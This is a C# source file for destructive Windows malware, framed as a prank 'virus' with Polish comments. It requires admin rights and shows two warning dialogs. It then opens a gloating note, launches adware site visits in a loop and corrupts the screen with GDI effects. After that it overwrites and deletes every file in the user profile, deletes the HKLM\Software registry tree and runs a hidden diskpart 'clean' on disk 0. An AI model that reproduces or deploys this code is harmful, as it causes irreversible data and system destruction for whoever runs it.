using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

class InternalSystemModule
{
    // --- WINAPI IMPORTS ---
    [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")] static extern bool GetCursorPos(out Point lpPoint);
    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left; public int Top; public int Right; public int Bottom; }
    const uint SRCCOPY = 0x00CC0020;
    const uint SRCINVERT = 0x00660046;

    static Random rnd = new Random();
    static bool destructionTriggered = false;

    // --- ADMIN CHECK ---
    static bool IsAdmin()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void Main()
    {
        if (!IsAdmin())
        {
            Process.Start("cmd.exe", "/c color c && echo Run as admin... && pause");
            return;
        }

        string msg1 = "This computer virus will destroy your computer beyond repair.\nAre you sure you want to enable the virus?";
        if (MessageBox.Show(msg1, "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
        {
            if (MessageBox.Show("Last warning: your computer will be Destroyed.", "Last Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes)
            {
                OpenInstructionNotepad();
                new Thread(MalwarePayload).Start();
                RunAdwarePhase();
            }
            else { SafeExit(); }
        }
    }

    static void SafeExit()
    {
        Process.Start("shutdown", "-s -t 10 -c \"Mild reset initiated.\"");
        Environment.Exit(0);
    }

    static void OpenInstructionNotepad()
    {
        try {
            string tempNote = Path.Combine(Path.GetTempPath(), "instructions.txt");
            string message = "Your computer has been bricked by malware.\n\n" +
                             ":D\n" +
                             "Don't try to reset your computer or kill the virus process, as this will cause a BSOD. By the way, your Regedit and UEFI have also been bricked, so instead of a computer, you'll have \"animations.\"";
            File.WriteAllText(tempNote, message);
            Process.Start("notepad.exe", tempNote);
        } catch { }
    }

    static void RunAdwarePhase()
    {
        string[] sites = { "https://chomikuj.pl", "https://18eh.github.io", "http://ptoszek.pl", "http://freerobux.com" };
        while (true)
        {
            try { Process.Start(new ProcessStartInfo(sites[rnd.Next(sites.Length)]) { UseShellExecute = true }); } catch { }
            Thread.Sleep(20000);
        }
    }

    static void MalwarePayload()
    {
        IntPtr desktop = GetDC(IntPtr.Zero);
        Graphics g = Graphics.FromHdc(desktop);
        RECT rect; GetWindowRect(GetDesktopWindow(), out rect);
        int w = rect.Right; int h = rect.Bottom;
        Stopwatch sw = Stopwatch.StartNew();

        while (true)
        {
            long ms = sw.ElapsedMilliseconds;

            // 0-40s: Ikony za myszką
            if (ms < 40000) {
                Point p; if (GetCursorPos(out p)) g.DrawIcon(SystemIcons.Error, p.X + rnd.Next(-30, 30), p.Y + rnd.Next(-30, 30));
                Thread.Sleep(20);
            }
            // 40-120s: Chaos wizualny i inwersja
            else if (ms < 120000) {
                if (rnd.Next(10) > 8) BitBlt(desktop, 0, 0, w, h, desktop, 0, 0, SRCINVERT);
                BitBlt(desktop, rnd.Next(w), rnd.Next(h), 150, 150, desktop, rnd.Next(w), rnd.Next(h), SRCCOPY);
                Thread.Sleep(40);
            }
            // 120-200s: Efekt Tunelu
            else if (ms < 200000) {
                BitBlt(desktop, 10, 10, w - 20, h - 20, desktop, 0, 0, SRCCOPY);
                Thread.Sleep(10);
            }
            // 200-260s: TikTok Spin (Scroll & Sinus)
            else if (ms < 260000) {
                BitBlt(desktop, 0, 10, w, h - 10, desktop, 0, 0, SRCCOPY);
                BitBlt(desktop, 0, 0, w, 10, desktop, 0, h - 10, SRCCOPY);
                int shift = (int)(Math.Sin(ms / 400.0) * 15);
                BitBlt(desktop, shift, 0, w, h, desktop, 0, 0, SRCCOPY);
                Thread.Sleep(10);
            }
            // 260s+: ROFUCKED DESTRUCTION
            else {
                if (!destructionTriggered) {
                    destructionTriggered = true;
                    new Thread(RoFuckedProcess).Start();
                }
                BitBlt(desktop, rnd.Next(-15, 15), rnd.Next(-15, 15), w, h, desktop, 0, 0, SRCCOPY);
                if (ms > 310000) {
                    Application.Run(new FinalAnimationForm()); // Pokazuje rybę
                    Process.Start("powershell.exe", "wininit"); // Zabija system
                }
                Thread.Sleep(5);
            }
        }
    }

    static void RoFuckedProcess()
    {
        // 1. Niszczenie plików
        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        try {
            foreach (string file in Directory.GetFiles(userPath, "*.*", SearchOption.AllDirectories)) {
                try { File.WriteAllBytes(file, new byte[100]); File.Delete(file); } catch { }
            }
        } catch { }

        // 2. Brickowanie Rejestru
        try {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software", true);
            foreach (string sub in key.GetSubKeyNames()) {
                try { key.DeleteSubKeyTree(sub); } catch { }
            }
        } catch { }

        // 3. Diskpart Clean (Wipe Dysk 0)
        try {
            string script = Path.Combine(Path.GetTempPath(), "d.txt");
            File.WriteAllText(script, "select disk 0\nclean");
            Process.Start(new ProcessStartInfo("diskpart.exe", "/s " + script) { WindowStyle = ProcessWindowStyle.Hidden });
        } catch { }
    }
}

// --- FINAŁOWA ANIMACJA ---
public class FinalAnimationForm : Form {
    private string text = "Computer have been BRICKED. Enjoy \"Animation\"";
    private int idx = 0;
    private float angle = 0;

    public FinalAnimationForm() {
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.BackColor = Color.Black;
        this.TopMost = true;
        
        System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 100 };
        t.Tick += (s, e) => { if (idx < text.Length) idx++; else { t.Stop(); StartSpin(); } this.Invalidate(); };
        t.Start();
    }

    private void StartSpin() {
        System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 30 };
        t.Tick += (s, e) => { angle += 15; this.Invalidate(); };
        t.Start();
    }

    protected override void OnPaint(PaintEventArgs e) {
        Font f = new Font("Consolas", 30, FontStyle.Bold);
        e.Graphics.DrawString(text.Substring(0, idx), f, Brushes.Lime, 50, this.Height / 2 - 100);

        if (idx >= text.Length) {
            e.Graphics.TranslateTransform(this.Width / 2, this.Height / 2);
            e.Graphics.RotateTransform(angle);
            e.Graphics.FillEllipse(Brushes.Gold, -100, -50, 200, 100); // Ryba/Chips
            e.Graphics.FillPolygon(Brushes.Gold, new Point[] { new Point(80, 0), new Point(150, -50), new Point(150, 50) });
        }
    }
}
